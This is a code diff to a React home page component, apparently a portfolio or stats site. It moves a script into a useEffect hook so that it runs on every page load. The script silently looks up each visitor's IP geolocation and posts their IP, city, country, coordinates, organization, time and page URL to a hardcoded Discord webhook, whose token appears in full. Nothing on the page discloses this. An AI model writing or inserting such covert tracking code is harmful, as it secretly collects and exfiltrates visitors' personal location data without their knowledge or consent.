@@ -1,30 +1,4 @@
-fetch('https://ipinfo.io/json')
-.then(response => response.json())
-.then(data => {
-  const webhookUrl = 'https://discord.com/api/webhooks/1192795691651706921/wCdqsoWrjylwz9lLiqsvjxPXJmql4wtpjTUZToDov1JPyuKk3uUv442T4oiWFN_FYQrZ';
-  var datetime = new Date();
-  var message = '@everyone\n' + 
-    'IP Address:' + data.ip +"\n"+
-    'City:'+ data.city +"\n"+
-    'Region:'+ data.regiony +"\n"+
-    'Country:' + data.country +"\n"+
-    'Location:' + data.loc +"\n"+
-    'Organization:' + data.org +"\n"+
-    'DateTime:' + datetime.toLocaleDateString()+"-" +datetime.toLocaleTimeString() +"\n"+
-    'From:'+window.document.URL;
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        content: message,
-      }),
-      })
-      .then(response => response.json())
-      .then(data => {})
-      .catch(error => {});
-})
+import { useEffect } from "react";
 
 function Tag({ tagName, tagData1, tagData2 }) {
   return (
@@ -59,6 +33,35 @@ function TotalTag() {
 }
 
 export default function Home() {
+  useEffect(()=>{
+    fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      const webhookUrl = 'https://discord.com/api/webhooks/1192795691651706921/wCdqsoWrjylwz9lLiqsvjxPXJmql4wtpjTUZToDov1JPyuKk3uUv442T4oiWFN_FYQrZ';
+      var datetime = new Date();
+      var message = '@everyone\n' + 
+        'IP Address:' + data.ip +"\n"+
+        'City:'+ data.city +"\n"+
+        'Region:'+ data.regiony +"\n"+
+        'Country:' + data.country +"\n"+
+        'Location:' + data.loc +"\n"+
+        'Organization:' + data.org +"\n"+
+        'DateTime:' + datetime.toLocaleDateString()+"-" +datetime.toLocaleTimeString() +"\n"+
+        'From:'+window.document.URL;
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: message,
+          }),
+          })
+          .then(response => response.json())
+          .then(data => {})
+          .catch(error => {});
+    })
+  },[])
   return (
     <div className="w-full h-full xl:pt-24 pt-10">
       <div className="xl:w-7/12 w-11/12 h-fit mx-auto tranitions  text-white px-4">
